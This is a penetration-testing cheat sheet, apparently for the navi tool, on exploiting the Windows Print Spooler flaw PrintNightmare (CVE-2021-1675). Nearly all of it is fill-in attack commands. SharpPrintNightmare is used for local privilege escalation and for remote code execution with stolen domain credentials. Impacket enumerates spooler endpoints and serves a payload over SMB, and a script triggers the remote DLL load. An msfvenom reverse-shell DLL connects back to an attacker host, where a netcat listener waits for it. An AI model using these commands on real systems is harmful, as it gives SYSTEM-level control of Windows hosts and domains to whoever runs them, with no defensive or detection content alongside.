---
technique: PrintNightmare
category: print-spooler
targets: Windows Print Spooler Service
protocols: RPC, SMB
remote_capable: true
tags: print-spooler printnightmare ms-rprn ms-par rpc smb rce lpe ad
---

# PrintNightmare

PrintNightmare abuses vulnerable Print Spooler driver installation paths to load an attacker-controlled DLL as SYSTEM. Remote exploitation requires reachable spooler RPC paths and a DLL hosted over SMB; local exploitation uses the same driver loading primitive for privilege escalation.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Spooler reachable | MS-RPRN or MS-PAR RPC endpoint must be exposed for remote exploitation |
| DLL payload | Target loads the DLL from an attacker-controlled SMB share |
| Listener | Reverse-shell payloads need a listener before triggering driver load |

## Windows

### SharpPrintNightmare LPE

#cmd #lpe #print-spooler

Trigger local privilege escalation by loading a local DLL through the vulnerable spooler path.

```cmd title:"Exploit PrintNightmare locally with SharpPrintNightmare"
.\SharpPrintNightmare.exe "$dll_path"
```
<!-- cheat
var dll_path
-->

### SharpPrintNightmare RCE current context

#cmd #rce #print-spooler

Trigger remote driver loading from an SMB path using the current user context.

```cmd title:"Exploit PrintNightmare remotely with current context"
.\SharpPrintNightmare.exe "\\$lhost\$share\$dll_name" "\\$target_ip"
```
<!-- cheat
import tun_ip
var share
var dll_name
var target_ip
-->

### SharpPrintNightmare RCE netonly

#cmd #rce #print-spooler

Trigger remote driver loading from an SMB path using supplied domain credentials.

```cmd title:"Exploit PrintNightmare remotely with supplied credentials"
.\SharpPrintNightmare.exe "\\$lhost\$share\$dll_name" "\\$target_ip" "$domain" "$user" "$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
import tun_ip
var share
var dll_name
var target_ip
-->

## Linux

### rpcdump spooler pipes

#python #impacket #recon

Check whether MS-RPRN or MS-PAR spooler RPC endpoints are registered on the target.

```sh title:"Check target for Print Spooler RPC endpoints"
rpcdump.py @$target_ip | egrep 'MS-RPRN|MS-PAR'
```
<!-- cheat
var target_ip
-->

### msfvenom DLL payload

#msfvenom #payload

Generate a reverse-shell DLL payload for remote spooler loading.

```sh title:"Generate PrintNightmare DLL reverse shell payload"
msfvenom -f dll -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -o "$dll_path"
```
<!-- cheat
import tun_ip
import lports
var dll_path
-->

### smbserver host payload

#impacket #smb #payload

Host the payload directory over SMB for the target spooler service to fetch.

```sh title:"Host PrintNightmare payload over SMB"
smbserver.py -smb2support "$share" "$payload_dir"
```
<!-- cheat
var share
var payload_dir
-->

### netcat listener

#bash #listener

Start a listener for the reverse-shell payload before triggering the exploit.

```sh title:"Start reverse shell listener for PrintNightmare"
nc -lvnp $lport
```
<!-- cheat
import lports
-->

### CVE-2021-1675.py

#python #rce #print-spooler

Trigger remote PrintNightmare exploitation against the target using the hosted DLL path.

```sh title:"Exploit PrintNightmare remotely with CVE-2021-1675.py"
CVE-2021-1675.py "$domain/$user:$pass@$target_ip" "\\\\$lhost\\$share\\$dll_name"
```
<!-- cheat
import domain_ip
import users
import passwords
import tun_ip
var target_ip
var share
var dll_name
-->
